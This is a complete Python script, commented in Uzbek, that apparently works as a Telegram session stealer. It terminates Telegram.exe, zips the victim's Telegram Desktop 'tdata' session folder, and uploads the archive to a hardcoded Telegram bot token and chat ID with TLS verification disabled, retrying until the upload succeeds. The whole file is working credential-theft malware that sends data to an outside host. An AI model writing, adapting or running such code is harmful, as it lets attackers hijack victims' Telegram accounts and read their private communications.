import os
import zipfile
import requests
import time
import psutil
from urllib3.exceptions import InsecureRequestWarning
import urllib3

urllib3.disable_warnings(InsecureRequestWarning)

TOKEN = '8163157021:AAGE1b81bD7n7NB4UMCXhIjYqnlM2ZGyFMo'
CHAT_ID = '7984884145'
TDATA_PATH = os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata')
ZIP_PATH = os.path.join(os.getenv('TEMP'), 'tdata.zip')

def kill_telegram_process():
    """Telegram processini o'chirish"""
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] == 'Telegram.exe':
            proc.kill()
            time.sleep(2)  # Protsess to'liq to'xtashi uchun

def zip_tdata():
    try:
        with zipfile.ZipFile(ZIP_PATH, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(TDATA_PATH):
                for file in files:
                    file_path = os.path.join(root, file)
                    try:
                        zipf.write(file_path, os.path.relpath(file_path, TDATA_PATH))
                    except PermissionError:
                        # Fayl band bo'lsa, qayta urinib ko'rish
                        time.sleep(0.1)
                        try:
                            zipf.write(file_path, os.path.relpath(file_path, TDATA_PATH))
                        except:
                            continue
        return True
    except Exception as e:
        print(f"Zip qilishda xato: {e}")
        return False

def send_to_telegram():
    url = f'https://api.telegram.org/bot{TOKEN}/sendDocument'
    try:
        with open(ZIP_PATH, 'rb') as f:
            response = requests.post(
                url,
                files={'document': f},
                data={'chat_id': CHAT_ID},
                verify=False,
                timeout=60
            )
        return response.status_code == 200
    except Exception as e:
        print(f"Yuborishda xato: {e}")
        return False

def main():
    # 1. Telegram processini o'chirish
    kill_telegram_process()
    
    # 2. tdata ni zip qilish
    if not zip_tdata():
        return False
    
    # 3. Faylni yuborish (3 marta urinish)
    for attempt in range(3):
        if send_to_telegram():
            print("Muvaffaqiyatli yuborildi!")
            return True
        time.sleep(5)
    
    print("Yuborish muvaffaqiyatsiz tugadi")
    return False

if __name__ == '__main__':
    main()
